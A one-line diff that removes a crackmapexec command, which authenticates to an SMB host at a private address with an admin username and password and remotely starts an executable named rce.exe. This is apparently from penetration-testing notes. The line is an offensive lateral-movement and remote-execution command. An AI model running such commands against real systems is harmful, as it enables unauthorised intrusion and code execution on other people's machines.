@@ -1,1 +1,0 @@
-crackmapexec smb 10.0.0.100 -u Admin1 -p Pa\$\$word -x 'start ./rce.exe' 
